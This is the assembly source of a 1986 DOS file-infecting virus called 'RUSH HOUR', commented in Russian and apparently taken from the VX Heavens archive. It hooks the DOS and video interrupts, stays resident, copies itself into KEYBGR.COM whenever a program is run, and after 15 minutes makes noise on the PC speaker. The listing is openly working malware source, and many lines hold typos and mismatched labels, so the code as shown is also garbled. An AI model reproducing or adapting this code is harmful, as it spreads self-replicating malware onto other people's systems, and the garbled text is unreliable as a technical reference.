; This file passed through VX Heavens http://vx.org.ua
             PAGE    72,132
             TITL    Virus "RUSH ROUR"         (p) foxi, 1986

             NAME    VIRUS

ABSO         SEGMENT AT 0
             ORG     4*10H
VIDEO_INT    DW      2 DUP (?)           ; вектор прерывания
                                         ; VIDEO
             ORG     4*21H
DOS_INT      DW      2 DUP (?)           ; DOS     -"-
             ORG     4*21H
ERROR_INT    DW      2 DUP (?)           ; ERROR   -"-
             ENDS

CODE         SEGMENT
             ASSUME  CS:CODE, DS:CODE, ES:CODE
             ORG     05CH
FSB          LABEL   BYTE
DRIVE        DB      ?
FSPEC        DB      11 DUP(' ')          ; имя файла
             ORG     6CH
FSIZE        DW      2 DUP (?)
FDATE        DW      ?                    ; дата внесения
                                          ; последней записи
FTIME        DW      ?                    ; время -"-  -"-
             ORG     8OH
DTA          DW      128 DUP(?)           ; область  передачи
                                          ; данных диска

             ORG     071EH                ; конец   обычного
                                          ; файла
                                          ; KEYBGR.COM
             XOR     AX,AX
             MOV     ES,AX                ; ES  указывает на
                                          ; ABSO
             ASSUME  ES:ABSO
             PUCH    CS
             POP     DS
             MOV     AX,VIDEO_INT         ; хранящиеся в памяти
                                          ; старые векторы
                                          ; прерывания
             MOV     BX,VIDEO_INT+2
             MOV     word ptr VIDEO_VECTOR,AX
             MOV     word ptr VIDEO_VECTOR+2,BX
             MOV     AX,DOS_INT
             MOV     BX,DOS_INT+2
             MOV     word ptr DOS_VECTOR,AX
             MOV     word ptr DOS_VECTOR+2,BX
             CLI
             MOV     DOS_INT,OFFSET VIRUS     ; новый вектор DOS
                                              ; указывает на
                                              ; VIRUS
             MOV     DOS_INT+2,CS
             MOV     VIDEO_INT,OFFSET DISEASE ; вектор VIDEO
                                              ; указывает на
                                              ; DISEASE
             MOV     VIDEO_INT+2,CS
             STI

             MOV     AH,0
             INT     1AH                      ; считать
                                              ; TimeOfDay
                                              ; (TOO)
             MOV     TIME_0,DX

             LEA     DX,VIRUS_ENDE
             INT     27H                      ; программа
                                              ; завершается,
                                              ; но остается
                                              ; резидентом
VIDIO_VECTOR Dd  (?)
DOS_VECTOR   Dd  (?)
ERROR_VECTOR DW  2 DUP(?)
TIME_0       DW     ?

;
;    Основная часть программы VIRUS :
;
;    1.   Вызов системы AH=4BH ?
;         Нет:---> 2.
;         Да : Проверить KEYBGR.COM на указанном дисководе
;              Файл уже заражен ?
;              Да : ---> 3.
;              Нет: внести вирус!
;
;    2.  Передача управления в обычный DOS
;
RNDVAL     DB     'bfhg'         ; неактивен
ACTIVE     DB     0              ; самый первый вирус
PRESET     DB     0              ; неактивен!

           DB     'A:'
FNAME      DB     'KEYBGR COM'
           DB     0

VIRUS      PROC   FAR
           ASSUME CS:CODE, DS:NOTHING, ES:NOTHING

           PUSH   AX
           PUSH   CX
           PUSH   DX

           MOV    AH,0           ; проверить , прошло ли по
                                 ; крайней мере 15 мин.
           INT    1AH            ; с момента инициализации
           SUB    DX,TIME_0      ; (16384 такта датчика
           CMP    DX,16384       ; времени =15 мин.)

           JL     $3
           MOV    ACTIVE,1       ; если да, активизировать
                                 ; вирус

$3:        POP    DX
           POP    CX
           POP    AX
                                 ; доступ к дискете через
                                 ; команду
           CMP    AX,4B00H       ; DOS
           JE     $1             ; "загрузить и выполнить
                                 ; программу"

EXIT_1:    JMP    DOS_VECTOR     ; Нет : ---> обычное положение

$1:        PUSH   ES             ; ES:BS ---> блок параметров
           PUSH   BX             ; DS:DX ---> имя файла
           PUSH   DX             ; сохраненные регистры, которые
                                 ; пока не нужны для INT 21H
           PUSH   DX             ; (AH=4BH)
           MOV    DI,DX
           MOV    DRIVE,0        ; Задать дисковод для
           MOV    AL,DS: DI+1    ; подлежащей исполнению
                                 ; программы
           CMP    AL,':'
           JNE    $5
           MOV    AL,DS: DI
           SUB    AL, 'A'-1
           MOV    DRIVE,AL

$5:
           CLD
           PUSH   CS
           POP    DS
           XOR    AX,AX
           MOV    ES,AX
           ASSUME DS: CODE, ES:ASSO
           MOV    AX,ERROR_INT    ; проигнорировать все
                                  ; "ошибки" дискеты с
           MOV    BX,ERROR_INT+2  ; помощью собственной
                                  ; программы обработки
                                  ; ошибок
           MOV    ERROR_VECTOR,AX
           MOV    ERROR_VECTOR+2,BX
           MOV    ERROR_INT,OFFSET ERROR
           MOV    ERROR_INT+2,CS

           PUSH   CS
           POP    ES
           ASSUME ES:CODE
           LEA    DX,DTA           ; область передачи данных
                                   ; диска выбрать
           MOV    AH,1AH
           INT    21H

           MOV    BX,11            ; передать имя файла
$2:
           MOV    AL,FNAME-1 BX
           MOV    FSPEC-1 BX,AL    ; в блок управления
                                   ; файлом
           DEC    BX
           JNZ    $2

           LEA    DX,FCB           ; открыть файл (для
           MOV    AH,0FH           ; записи)
           INT    21H
           CMP    AL,0
           JNE    EXIT_0           ; файл не существует
                                   ;---> завершение
           mov    byte ptr fcb+20h,0 ;

           MOV    AX,FTIME         ; файл уже заражен?
           CMP    AX,4800H
           JE     EXIT_0           ; Да ---> завершение

           MOV    PRESET,1         ; ( все копии
                                   ; заражены!)
           MOV    SI,100H          ; записать вирус
                                   ; в файл
$4:
           LEA    DI,DTA
           MOV    CX,128
           REP    MOVSB
           LEA    DX,FCB
           MOV    AH,15H
           INT    21H
           CMP    SI,OFFSET VIRUS_ENDE
           JL     $4
           MOV    FSIZE,OFFSET VIRUS_ENDE-100H
           MOV    FSIZE+2,0         ; задать корректный
                                    ; размер файла
           MOV    FDATE,0AA3H       ; задать корректную
                                    ; дату(03.05.86)
           MOV    FTIME,4800H       ; задать корректное
                                    ; время (09:00:00)
           LEA    DX,FCB            ; закрыть файл
           MOV    AH,10H
           INT    21H
           XOR    AX,AX
           MOV    ES,AX
           ASSUME ES:ABSO

           MOV    AX,ERROR_VECTOR     ; сбросить прерывание
                                      ; по ошибке
           MOV    BX,ERROR_VECTOR+2
           MOV    ERROR_INT,AX
           MOV    ERROR_INT+2,BX

EXIT_0:
           POP    DX                  ; восстановить значение
                                      ; сохраненного регистра
           POP    DS
           POP    BX
           POP    ES
           ASSUME DS:NOTHING, ES:NOTHING
           MOV    AX,4B00H
           JMP    DOS_VECTOR          ; нормальное выполнение
                                      ; функции
VIRUS      ENDS

ERROR      PROC    FAR
           IRET                       ; просто игнорировать
                                      ; все ошибки
ERROR      ENDP

DISEASE    PROC   FAR

           ASSUME DS:NOTHING, ES:NOTHING
           PUSH   AX
           PUSH   CX                  ; этот регистр
                                      ; разрушается !
           TEST   PRESET,1
           JZ     EXIT_2
           TEST   ACTIVE,1
           JZ     EXIT_2

            IN     AL,61H             ; включить динамик
            AND    AL,0FEH            ; (бит 0:=0)
            OUT    61H,AL

            MOV    CX,3               ; счетчик циклов СХ

NOISE:
           MOV    AL,RNDVA            ;   :
           XOR    AL,RNDVAL+3         ;   :
           SHL    AL,1                ; сгенерировать шум
           SHL    AL,1                ;   :
           RCL    WORD PRT RNDVAL,1   ;   :
           RCL    WORD PRT RNDVAL+2,1 ;   :

           MOV    AH,RNDVAL
           AND    AH,2                ; вывод любого
           IN     AL,61H              ; бита сдвигового
           AND    AL,OFDH             ; регистра с
           OR     AL,AH               ; положительной
           OUT    61H,AL              ; обратной связью
           LOOP   NOISE              ;---> динамик шумит

           AND    AL,OFCH            ; динамик отключить
           OR     AL,1
           OUT    61H,AL

EXIT_2:
           POP    CX
           POP    AX
           JMP    VIDEO_VECTOR       ; переход в обычную
                                     ; программу
DISEASE    ENDP
           DB 'Эта программа является так называемой программой-'
           DB 'вирусом. Однажды активированная, она берет под   '
           DB 'свой контроль все системные устройства и даже    '
           DB 'выбранную пользователем запоминающую среду. Она  '
           DB 'самостоятельно копируется в пока незараженную    '
           DB 'операционную систему и тем самым распространяется'
           DB 'бесконтрольно. В этом случае вирус не разрушает  '
           DB 'программы пользователя или запоминающую среду,   '
           DB 'а лишь проявляет "филантропические" наклонности  '
           DB 'своего создателя...'

           ORG   1C2AH
VIRUS_ENDE LABEL      BYTE

CODE       ENDS
           END
